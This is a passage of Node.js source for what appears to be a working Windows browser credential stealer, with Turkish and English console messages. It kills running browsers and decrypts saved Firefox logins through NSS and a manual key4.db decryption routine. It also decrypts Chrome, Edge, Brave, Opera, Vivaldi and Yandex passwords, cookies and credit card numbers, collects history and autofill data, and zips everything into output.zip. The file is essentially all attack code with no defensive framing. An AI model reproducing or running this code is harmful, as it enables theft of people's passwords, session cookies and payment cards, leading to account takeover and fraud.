    const lr = firefoxDerReadLength(buf, off);
    const value = buf.subarray(lr.next, lr.next + lr.len);
    return { tag, value, end: lr.next + lr.len };
}

function firefoxDerSequenceValues(seqBuf) {
    const out = [];
    let p = 0;
    while (p < seqBuf.length) {
        const t = firefoxDerTlv(seqBuf, p);
        out.push(t);
        p = t.end;
    }
    return out;
}

function firefoxHashGlobalSalt(globalSalt) {
    return crypto.createHash('sha1').update(globalSalt).update(Buffer.alloc(0)).digest();
}

function firefoxPkcs7Unpad(buf, blockSize) {
    if (!buf.length) return buf;
    const pad = buf[buf.length - 1];
    if (pad < 1 || pad > blockSize || pad > buf.length) return null;
    for (let i = 0; i < pad; i++) if (buf[buf.length - 1 - i] !== pad) return null;
    return buf.subarray(0, buf.length - pad);
}

function firefoxPbes2DecryptA11(a11, globalSalt) {
    try {
        const top = firefoxDerTlv(a11, 0);
        if (top.tag !== 0x30) return null;
        const parts = firefoxDerSequenceValues(top.value);
        if (parts.length < 2 || parts[0].tag !== 0x30 || parts[1].tag !== 0x04) return null;
        const algId = parts[0];
        const cipherBlob = parts[1];
        const algParts = firefoxDerSequenceValues(algId.value);
        if (algParts.length < 2 || algParts[0].tag !== 0x06) return null;
        if (!algParts[0].value.equals(PKCS5_PBES2_OID)) return null;
        const afterOid = firefoxDerTlv(algId.value, algParts[0].end);
        if (afterOid.tag !== 0x30) return null;
        const p2 = firefoxDerSequenceValues(afterOid.value);
        if (p2.length < 2) return null;
        const kdfSeq = p2[0];
        const encSeq = p2[1];
        if (kdfSeq.tag !== 0x30 || encSeq.tag !== 0x30) return null;
        const kdfOid = firefoxDerTlv(kdfSeq.value, 0);
        const kdfParamsSeq = firefoxDerTlv(kdfSeq.value, kdfOid.end);
        if (kdfParamsSeq.tag !== 0x30) return null;
        const pbParts = firefoxDerSequenceValues(kdfParamsSeq.value);
        if (pbParts.length < 2 || pbParts[0].tag !== 0x04 || pbParts[1].tag !== 0x02) return null;
        const salt = pbParts[0].value;
        const iter = Number(BigInt('0x' + pbParts[1].value.toString('hex')));
        let keyLen = 32;
        if (pbParts.length >= 3 && pbParts[2].tag === 0x02) {
            keyLen = Number(BigInt('0x' + pbParts[2].value.toString('hex')));
        }
        const encOid = firefoxDerTlv(encSeq.value, 0);
        const encIvT = firefoxDerTlv(encSeq.value, encOid.end);
        if (encIvT.tag !== 0x04) return null;
        const encIv = encIvT.value;
        const hashedSalt = firefoxHashGlobalSalt(globalSalt);
        const dk = crypto.pbkdf2Sync(hashedSalt, salt, iter, keyLen, 'sha256');
        const iv = Buffer.concat([Buffer.from([0x04, 0x0e]), encIv]);
        if (iv.length !== 16) return null;
        const ct = cipherBlob.value;
        const decipher = crypto.createDecipheriv('aes-256-cbc', dk, iv);
        decipher.setAutoPadding(false);
        const pt = Buffer.concat([decipher.update(ct), decipher.final()]);
        return firefoxPkcs7Unpad(pt, 16) || pt;
    } catch (e) {
        return null;
    }
}

function firefoxParseAsn1LoginBlob(buf) {
    if (!buf || buf.length < 20 || buf[0] !== 0x30) return null;
    try {
        const top = firefoxDerTlv(buf, 0);
        if (top.tag !== 0x30) return null;
        const parts = firefoxDerSequenceValues(top.value);
        if (parts.length < 3) return null;
        const keyIdT = parts[0];
        const encSchemeT = parts[1];
        const ctT = parts[2];
        if (keyIdT.tag !== 0x04 || encSchemeT.tag !== 0x30 || ctT.tag !== 0x04) return null;
        const es = firefoxDerSequenceValues(encSchemeT.value);
        if (es.length < 2 || es[0].tag !== 0x06 || es[1].tag !== 0x04) return null;
        return { keyId: keyIdT.value, iv: es[1].value, ciphertext: ctT.value };
    } catch (e) {
        return null;
    }
}

function firefoxDecryptAsn1LoginCipher(iv, ciphertext, mk) {
    if (!iv || !ciphertext || ciphertext.length < 17 || !mk || mk.length < 16) return null;
    const tag = ciphertext.subarray(ciphertext.length - 16);
    const encData = ciphertext.subarray(0, ciphertext.length - 16);
    const nonce12 = iv.length >= 12 ? iv.subarray(0, 12) : Buffer.concat([iv, Buffer.alloc(12 - iv.length, 0)]).subarray(0, 12);
    for (const kl of [32, 24]) {
        if (mk.length < kl) continue;
        const key = mk.subarray(0, kl);
        const algo = kl === 32 ? 'aes-256-gcm' : 'aes-192-gcm';
        try {
            const d = crypto.createDecipheriv(algo, key, nonce12);
            d.setAuthTag(tag);
            return Buffer.concat([d.update(encData), d.final()]).toString('utf8');
        } catch (e) {}
    }
    if (iv.length >= 16) {
        const nonce16 = iv.subarray(0, 16);
        for (const kl of [32, 24]) {
            if (mk.length < kl) continue;
            const key = mk.subarray(0, kl);
            const algo = kl === 32 ? 'aes-256-gcm' : 'aes-192-gcm';
            try {
                const d = crypto.createDecipheriv(algo, key, nonce16);
                d.setAuthTag(tag);
                return Buffer.concat([d.update(encData), d.final()]).toString('utf8');
            } catch (e) {}
        }
    }
    if (mk.length >= 24 && iv.length >= 8 && encData.length > 0) {
        try {
            const d3 = crypto.createDecipheriv('des-ede3-cbc', mk.subarray(0, 24), iv.subarray(0, 8));
            d3.setAutoPadding(false);
            const pt = Buffer.concat([d3.update(encData), d3.final()]);
            const unp = firefoxPkcs7Unpad(pt, 8);
            const raw = unp || pt;
            const s = raw.toString('utf8').replace(/\0+$/, '').trim();
            if (s) return s;
        } catch (e) {}
    }
    return null;
}

async function firefoxDecryptLoginsKey4(profilePath, logins) {
    const key4Path = path.join(profilePath, 'key4.db');
    if (!fs.existsSync(key4Path) || !Array.isArray(logins)) return [];
    const saltRows = await query(key4Path, "SELECT item1 FROM metadata WHERE id = 'password'");
    if (!saltRows.length || saltRows[0].item1 == null) return [];
    let globalSalt = saltRows[0].item1;
    if (!Buffer.isBuffer(globalSalt)) globalSalt = Buffer.from(globalSalt);

    const nsRows = await query(key4Path, 'SELECT a11, a102 FROM nssPrivate WHERE a11 IS NOT NULL LIMIT 1');
    if (!nsRows.length || nsRows[0].a11 == null) return [];
    let a102 = nsRows[0].a102;
    let a11 = nsRows[0].a11;
    if (!Buffer.isBuffer(a102)) a102 = Buffer.from(a102);
    if (!Buffer.isBuffer(a11)) a11 = Buffer.from(a11);
    if (!a102.equals(FIREFOX_NSS_CK_ID)) return [];

    const mk = firefoxPbes2DecryptA11(a11, globalSalt);
    if (!mk || mk.length < 16) return [];

    const results = [];
    for (const entry of logins) {
        try {
            const encUser = Buffer.from(entry.encryptedUsername || '', 'base64');
            const encPass = Buffer.from(entry.encryptedPassword || '', 'base64');
            const asnU = firefoxParseAsn1LoginBlob(encUser);
            const asnP = firefoxParseAsn1LoginBlob(encPass);
            if (!asnP || !asnP.keyId.equals(FIREFOX_NSS_CK_ID)) continue;
            const passStr = firefoxDecryptAsn1LoginCipher(asnP.iv, asnP.ciphertext, mk);
            if (!passStr) continue;
            let userStr = '[UNKNOWN]';
            if (asnU && asnU.keyId.equals(FIREFOX_NSS_CK_ID)) {
                userStr = firefoxDecryptAsn1LoginCipher(asnU.iv, asnU.ciphertext, mk) || '[UNKNOWN]';
            }
            results.push({
                url: entry.hostname || entry.host || '',
                user: userStr,
                password: passStr
            });
        } catch (e) {}
    }
    return results;
}

async function firefoxDecryptLogins(profilePath) {
    const installDirs = firefoxInstallDirs();
    if (!installDirs.length) {
        console.log(
            '    [!] Firefox: nss3.dll bulunamadı. Firefox kur veya FIREFOX_INSTALL_DIR ortam değişkenini nss3.dll içeren klasöre ayarla (portable).'
        );
        return [];
    }

    const loginsPath = path.join(profilePath, 'logins.json');
    if (!fs.existsSync(loginsPath)) {
        console.log('    [*] Firefox: bu profilde logins.json yok.');
        return [];
    }

    let raw;
    try {
        raw = JSON.parse(fs.readFileSync(loginsPath, 'utf8'));
    } catch (e) {
        console.log(`    [!] Firefox: logins.json okunamadı: ${e.message}`);
        return [];
    }
    const logins = raw.logins;
    if (!Array.isArray(logins) || !logins.length) {
        console.log('    [*] Firefox: logins.json içinde kayıt yok.');
        return [];
    }

    const kernel32 = koffi.load('kernel32.dll');
    const SetDllDirectoryA = kernel32.func('bool SetDllDirectoryA(str)');
    const profileUrl = 'sql:' + path.resolve(profilePath).replace(/\\/g, '/');

    function secItemToUtf8(out) {
        if (!out || out.data == null || !out.len) return '';
        const n = out.len;
        if (Buffer.isBuffer(out.data)) return out.data.subarray(0, n).toString('utf8').replace(/\0/g, '');
        if (out.data instanceof Uint8Array) {
            return Buffer.from(out.data.buffer, out.data.byteOffset, Math.min(n, out.data.byteLength))
                .toString('utf8')
                .replace(/\0/g, '');
        }
        return Buffer.from(out.data).subarray(0, n).toString('utf8').replace(/\0/g, '');
    }

    for (const firefoxDir of installDirs) {
        SetDllDirectoryA(firefoxDir);
        let nss;
        try {
            const mozglue = path.join(firefoxDir, 'mozglue.dll');
            if (fs.existsSync(mozglue)) {
                try {
                    koffi.load(mozglue);
                } catch (e) {}
            }
            const softokn = path.join(firefoxDir, 'softokn3.dll');
            if (fs.existsSync(softokn)) {
                try {
                    koffi.load(softokn);
                } catch (e) {}
            }
            nss = koffi.load(path.join(firefoxDir, 'nss3.dll'));
        } catch (e) {
            console.log(`    [!] Firefox NSS yüklenemedi (${firefoxDir}): ${e.message}`);
            SetDllDirectoryA(null);
            continue;
        }

        const NSS_Init = nss.func('int NSS_Init(str)');
        const NSS_Shutdown = nss.func('int NSS_Shutdown()');
        const PK11_GetInternalKeySlot = nss.func('void* PK11_GetInternalKeySlot()');
        const PK11_NeedLogin = nss.func('int PK11_NeedLogin(void*)');
        const PK11_CheckUserPassword = nss.func('int PK11_CheckUserPassword(void*, str)');
        const PK11_FreeSlot = nss.func('void PK11_FreeSlot(void*)');
        const PK11SDR_Decrypt = nss.func('int PK11SDR_Decrypt(SECItem *data, _Out_ SECItem *result, void *cx)');
        let secitemRelease = null;
        try {
            secitemRelease = nss.func('void SECITEM_ZfreeItem(SECItem *item, int freeit)');
        } catch (e) {
            secitemRelease = nss.func('void SECITEM_FreeItem(SECItem *item, int freeit)');
        }

        const initRv = NSS_Init(profileUrl);
        if (initRv !== 0) {
            console.log(
                `    [!] NSS_Init başarısız (kod ${initRv}). key4.db / cert9.db eksik olabilir veya profil yolu: ${profilePath}`
            );
            SetDllDirectoryA(null);
            continue;
        }

        const slot = PK11_GetInternalKeySlot();
        if (!slot) {
            NSS_Shutdown();
            SetDllDirectoryA(null);
            console.log('    [!] PK11_GetInternalKeySlot boş döndü.');
            continue;
        }

        let authOk = true;
        if (PK11_NeedLogin(slot)) {
            if (PK11_CheckUserPassword(slot, '') !== 0) {
                authOk = false;
                console.log('    [!] Primary password (ana parola) ayarlı; boş şifre ile açılamadı.');
            }
        }
        PK11_FreeSlot(slot);
        if (!authOk) {
            NSS_Shutdown();
            SetDllDirectoryA(null);
            continue;
        }

        const results = [];
        let decryptErrors = 0;
        for (const entry of logins) {
            try {
                const encUser = Buffer.from(entry.encryptedUsername || '', 'base64');
                const encPass = Buffer.from(entry.encryptedPassword || '', 'base64');

                let user = '[UNKNOWN]';
                if (encUser.length) {
                    const inUser = { type: 0, data: encUser, len: encUser.length >>> 0 };
                    const outUser = { type: 0, data: null, len: 0 };
                    if (PK11SDR_Decrypt(inUser, outUser, null) === 0) {
                        user = secItemToUtf8(outUser) || '[UNKNOWN]';
                        secitemRelease(outUser, 0);
                    }
                }
                let password = '';
                if (encPass.length) {
                    const inPass = { type: 0, data: encPass, len: encPass.length >>> 0 };
                    const outPass = { type: 0, data: null, len: 0 };
                    if (PK11SDR_Decrypt(inPass, outPass, null) === 0) {
                        password = secItemToUtf8(outPass);
                        secitemRelease(outPass, 0);
                    } else {
                        decryptErrors++;
                    }
                }
                if (password) {
                    results.push({
                        url: entry.hostname || entry.host || '',
                        user,
                        password
                    });
                }
            } catch {
                decryptErrors++;
            }
        }

        NSS_Shutdown();
        SetDllDirectoryA(null);

        if (results.length) {
            console.log(`    [*] NSS: ${firefoxDir}`);
            return results;
        }
        if (decryptErrors || logins.length) {
            console.log(`    [!] NSS (${firefoxDir}): PK11SDR bu profilde başarısız; key4.db yolu denenecek.`);
        }
    }

    const k4 = await firefoxDecryptLoginsKey4(profilePath, logins);
    if (k4.length) {
        console.log('    [+] Firefox şifreler key4.db + logins.json (AES) ile çözüldü.');
        return k4;
    }
    console.log(
        `    [!] ${logins.length} login: NSS ve key4 AES yolu başarısız (ana parola / farklı şifreleme).`
    );
    return [];
}

function parseFirefoxProfilesIni() {
    const iniPath = path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'profiles.ini');
    if (!fs.existsSync(iniPath)) return [];
    const text = fs.readFileSync(iniPath, 'utf8');
    const profiles = [];
    let current = null;
    for (const line of text.split(/\r?\n/)) {
        const s = line.trim();
        if (/^\[[Pp]rofile\d+\]$/.test(s)) {
            current = {};
            profiles.push(current);
            continue;
        }
        if (!current) continue;
        const m = s.match(/^(\w+)=(.*)$/);
        if (!m) continue;
        const k = m[1].toLowerCase();
        const v = m[2];
        if (k === 'path') current.path = v;
        if (k === 'isrelative') current.isrelative = v === '1';
    }
    const root = path.join(process.env.APPDATA, 'Mozilla', 'Firefox');
    const out = [];
    for (const p of profiles) {
        if (!p.path) continue;
        const abs = p.isrelative ? path.join(root, p.path) : p.path;
        if (fs.existsSync(abs)) out.push(abs);
    }
    return [...new Set(out)];
}

function discoverFirefoxProfiles() {
    const profRoot = path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const fromIni = parseFirefoxProfilesIni();
    const fromDisk = [];
    if (fs.existsSync(profRoot)) {
        for (const name of fs.readdirSync(profRoot)) {
            const full = path.join(profRoot, name);
            try {
                if (!fs.statSync(full).isDirectory()) continue;
            } catch (e) {
                continue;
            }
            const has =
                fs.existsSync(path.join(full, 'logins.json')) ||
                fs.existsSync(path.join(full, 'places.sqlite')) ||
                fs.existsSync(path.join(full, 'cookies.sqlite')) ||
                fs.existsSync(path.join(full, 'key4.db'));
            if (has) fromDisk.push(full);
        }
    }
    return [...new Set([...fromIni, ...fromDisk])];
}

async function extractFirefox(outDir) {
    const profiles = discoverFirefoxProfiles();
    if (!profiles.length) {
        console.log('[!] Firefox profili yok (profiles.ini veya Profiles klasörü).');
        return;
    }
    console.log(`[*] Firefox: ${profiles.length} profile(s).`);

    for (const profilePath of profiles) {
        const safeName = path.basename(profilePath).replace(/[^\w.-]+/g, '_');
        const browserOutDir = path.join(outDir, 'Firefox', safeName);
        if (!fs.existsSync(browserOutDir)) fs.mkdirSync(browserOutDir, { recursive: true });

        console.log(`[*] Firefox profile: ${profilePath}`);

        const logins = await firefoxDecryptLogins(profilePath);
        if (logins.length) {
            let loginData = '';
            for (const row of logins) {
                loginData += `${row.url} | ${row.user} | ${row.password}\n`;
            }
            fs.writeFileSync(path.join(browserOutDir, 'passwords.txt'), loginData);
            console.log(`    [+] Saved ${logins.length} passwords (NSS).`);
        }

        const placesDb = path.join(profilePath, 'places.sqlite');
        if (!fs.existsSync(placesDb)) {
            console.log('    [*] Firefox: places.sqlite yok (geçmiş çıkarılamadı).');
        } else {
            let history = await query(
                placesDb,
                'SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE url IS NOT NULL LIMIT 50000'
            );
            if (!history.length) {
                history = await query(
                    placesDb,
                    'SELECT url, title, visit_count FROM moz_places WHERE url IS NOT NULL LIMIT 50000'
                );
            }
            let histData = '';
            for (const row of history) {
                histData += `[${row.visit_count}] ${row.title || ''} - ${row.url}\n`;
            }
            if (histData) {
                fs.writeFileSync(path.join(browserOutDir, 'history.txt'), histData);
                console.log(`    [+] Saved ${history.length} history rows.`);
            } else {
                console.log('    [*] Firefox: moz_places boş veya okunamadı.');
            }
        }

        const cookiesDb = path.join(profilePath, 'cookies.sqlite');
        if (!fs.existsSync(cookiesDb)) {
            console.log('    [*] Firefox: cookies.sqlite yok.');
        } else {
            let cookies = await query(
                cookiesDb,
                'SELECT host, name, value, path, expiry, isSecure FROM moz_cookies LIMIT 100000'
            );
            if (!cookies.length) {
                cookies = await query(
                    cookiesDb,
                    'SELECT host, name, value, path, expiry FROM moz_cookies LIMIT 100000'
                );
            }
            let cookieData = '# Netscape HTTP Cookie File\n';
            for (const row of cookies) {
                const sec = row.isSecure === 1 || row.isSecure === true ? 'TRUE' : 'FALSE';
                const dom = row.host || '';
                const flag = dom.startsWith('.') ? 'TRUE' : 'FALSE';
                cookieData += `${dom}\t${flag}\t${row.path || '/'}\t${sec}\t${row.expiry || 0}\t${row.name}\t${row.value || ''}\n`;
            }
            if (cookieData.length > '# Netscape HTTP Cookie File\n'.length) {
                fs.writeFileSync(path.join(browserOutDir, 'cookies.txt'), cookieData);
                console.log(`    [+] Saved ${cookies.length} cookies.`);
            } else {
                console.log('    [*] Firefox: moz_cookies boş.');
            }
        }

        const formHistDb = path.join(profilePath, 'formhistory.sqlite');
        if (fs.existsSync(formHistDb)) {
            const fhRows = await query(formHistDb, 'SELECT fieldname, value FROM moz_formhistory LIMIT 50000');
            let autoData = '';
            for (const row of fhRows) {
                const v = row.value != null ? String(row.value) : '';
                if (v) autoData += `${row.fieldname}: ${v}\n`;
            }
            if (autoData) {
                fs.writeFileSync(path.join(browserOutDir, 'autofill.txt'), autoData);
                console.log(`    [+] Saved ${fhRows.length} Firefox form history rows → autofill.txt.`);
            }
        }
    }
}

async function extractChromiumBrowser(browser, outDir) {
    console.log(`[*] Checking for ${browser.name} at ${browser.path}...`);
    if (!fs.existsSync(browser.path)) {
        console.log(`[!] ${browser.name} path not found.`);
        return;
        }

        console.log(`[*] ${browser.name} found. Deriving master key...`);
    const mk = await getMasterKeyChromium(browser.path);
    if (!mk || !mk.keys || !mk.keys.length) {
            console.log(`[!] Failed to derive master key for ${browser.name}.`);
        return;
        }
    const keys = mk.keys;
    console.log(`[+] Master key derived for ${browser.name} (${keys.length} AES key candidate(s)).`);

    const profiles = listChromiumProfiles(browser.path);
        console.log(`[*] Found ${profiles.length} profiles for ${browser.name}: ${profiles.join(', ')}`);

        for (const profile of profiles) {
            const profilePath = path.join(browser.path, profile);
        const browserOutDir = path.join(outDir, browser.name, profile.replace(/[\\/]/g, '_'));
            if (!fs.existsSync(browserOutDir)) fs.mkdirSync(browserOutDir, { recursive: true });

            console.log(`[*] Extracting data from ${browser.name} profile: ${profile}...`);

            const loginDb = path.join(profilePath, 'Login Data');
            const logins = await query(loginDb, 'SELECT origin_url, username_value, password_value FROM logins');
            let loginData = '';
            for (const row of logins) {
            const pass = await decryptValue(row.password_value, keys);
                if (pass) loginData += `${row.origin_url} | ${row.username_value} | ${pass}\n`;
            }
            if (loginData) {
                fs.writeFileSync(path.join(browserOutDir, 'passwords.txt'), loginData);
            console.log(`    [+] Saved ${logins.length} login rows (decrypted where possible).`);
        }

        const cookieDbNetwork = path.join(profilePath, 'Network', 'Cookies');
        const cookieDbLegacy = path.join(profilePath, 'Cookies');
        const cookieDb = fs.existsSync(cookieDbNetwork) ? cookieDbNetwork : cookieDbLegacy;
        const cookies = await query(
            cookieDb,
            'SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, has_expires FROM cookies'
        );
            let cookieData = '# Netscape HTTP Cookie File\n';
        let decryptedCount = 0;
            for (const row of cookies) {
                const val = await chromiumCookieDisplayValue(row, keys);
                if (val) {
                    decryptedCount++;
                    cookieData += netscapeCookieLine(row, val);
                }
            }
            if (cookieData.length > '# Netscape HTTP Cookie File\n'.length) {
                fs.writeFileSync(path.join(browserOutDir, 'cookies.txt'), cookieData);
            console.log(`    [+] Saved ${decryptedCount} cookies (${cookies.length} rows in DB).`);
        } else if (cookies.length) {
            const sample = sqlBlobToBuffer(cookies[0].encrypted_value);
            const hex = sample && sample.length >= 4 ? sample.slice(0, 4).toString('hex') : 'empty';
            console.log(
                `    [!] ${cookies.length} cookie rows but 0 decrypted (blob prefix ${hex}…). Key or format mismatch.`
            );
        }

            const webDb = path.join(profilePath, 'Web Data');
            const cc = await query(webDb, 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards');
            let ccData = '';
            for (const row of cc) {
            const num = await decryptValue(row.card_number_encrypted, keys);
                if (num) ccData += `Name: ${row.name_on_card}\nExpiry: ${row.expiration_month}/${row.expiration_year}\nNumber: ${num}\n\n`;
            }
            if (ccData) fs.writeFileSync(path.join(browserOutDir, 'cc.txt'), ccData);

            const autofill = await query(webDb, 'SELECT name, value FROM autofill');
            let autoData = '';
            for (const row of autofill) {
                if (row.value == null || row.value === '') continue;
                const buf = sqlBlobToBuffer(row.value);
                let disp = null;
                if (buf && buf.length > 15) {
                    const h = buf.slice(0, 3).toString();
                    if (h === 'v10' || h === 'v11' || h === 'v20') {
                        disp = await decryptValue(buf, keys);
                    }
                }
                if (!disp) {
                    disp =
                        typeof row.value === 'string'
                            ? row.value
                            : buf && buf.length
                              ? buf.toString('utf8')
                              : String(row.value);
                }
                if (disp) autoData += `${row.name}: ${disp}\n`;
            }
            if (autoData) fs.writeFileSync(path.join(browserOutDir, 'autofill.txt'), autoData);

            const histDb = path.join(profilePath, 'History');
            const history = await query(histDb, 'SELECT url, title, visit_count, last_visit_time FROM urls');
            let histData = '';
            for (const row of history) {
                histData += `[${row.visit_count}] ${row.title} - ${row.url}\n`;
            }
            if (histData) {
                fs.writeFileSync(path.join(browserOutDir, 'history.txt'), histData);
                console.log(`    [+] Saved ${history.length} history records.`);
            }
        }
    }

function zipBrowsersToOutput(browsersDir, zipPath) {
    const src = path.resolve(browsersDir);
    const dst = path.resolve(zipPath);
    if (!fs.existsSync(src)) {
        console.log('[!] Browsers folder missing; skip zip.');
        return;
    }
    try {
        if (fs.existsSync(dst)) fs.unlinkSync(dst);
    } catch (e) {
        console.log(`    [!] Could not remove old zip: ${e.message}`);
    }
    const q = (p) => p.replace(/'/g, "''");
    try {
        execSync(
            `powershell -NoProfile -Command "Compress-Archive -LiteralPath '${q(src)}' -DestinationPath '${q(dst)}' -Force"`,
            { stdio: 'inherit', windowsHide: true, timeout: 600000 }
        );
        console.log(`[+] ${path.basename(dst)}`);
    } catch (e) {
        console.log(`    [!] Zip failed: ${e.message}`);
    }
}

async function run() {
    console.log('[*] Script started.');
    await killTargetBrowsers();

    const chromiumBrowsers = [
        { name: 'Chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data') },
        { name: 'Chromium', path: path.join(process.env.LOCALAPPDATA, 'Chromium', 'User Data') },
        { name: 'Edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data') },
        { name: 'Brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data') },
        { name: 'Opera', path: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable') },
        { name: 'Opera_GX', path: path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable') },
        { name: 'Vivaldi', path: path.join(process.env.LOCALAPPDATA, 'Vivaldi', 'User Data') },
        { name: 'Yandex', path: path.join(process.env.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data') },
        {
            name: 'Yandex_Beta',
            path: path.join(process.env.LOCALAPPDATA, 'Yandex', 'YandexBrowser-Beta', 'User Data')
        }
    ];

    const outDir = path.join(process.cwd(), 'Browsers');
    if (!fs.existsSync(outDir)) {
        console.log(`[*] Creating: ${outDir}`);
        fs.mkdirSync(outDir, { recursive: true });
    }

    for (const b of chromiumBrowsers) {
        await extractChromiumBrowser(b, outDir);
    }

    await extractFirefox(outDir);

    zipBrowsersToOutput(outDir, path.join(process.cwd(), 'output.zip'));
    console.log('[*] Done. Browsers/ + output.zip');
}

run();
